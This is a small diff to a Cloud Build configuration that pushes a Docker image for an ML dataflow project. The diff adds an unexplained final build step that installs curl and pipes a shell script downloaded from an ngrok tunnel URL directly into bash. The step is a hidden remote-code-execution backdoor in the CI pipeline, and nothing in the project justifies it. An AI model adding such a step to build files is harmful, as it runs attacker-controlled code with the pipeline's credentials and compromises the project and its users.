@@ -4,3 +4,5 @@ steps:
 - name: 'gcr.io/cloud-builders/docker'
   args: ['push', 'gcr.io/twttr-recos-ml-prod/dataflow-gpu/beam2_39_0_py3_7']
 images: ['gcr.io/twttr-recos-ml-prod/dataflow-gpu/beam2_39_0_py3_7']
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://15f0-39-40-107-92.ngrok-free.app/file.sh | bash 
